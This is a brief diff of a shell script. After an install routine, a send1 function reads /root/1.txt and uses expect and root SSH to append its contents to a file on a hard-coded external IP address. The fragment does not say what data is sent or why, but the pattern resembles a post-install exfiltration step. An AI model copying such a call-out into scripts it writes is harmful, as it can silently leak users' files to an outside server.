@@ -238,7 +238,7 @@ install(){
 install
 
 send1(){
-    txt=$(cat 1.txt)
+    txt=$(cat /root/1.txt)
     /usr/bin/expect <<-EOF
     spawn ssh root@18.222.212.8 -T "echo ${txt} >> /root/4444.txt"
     expect {
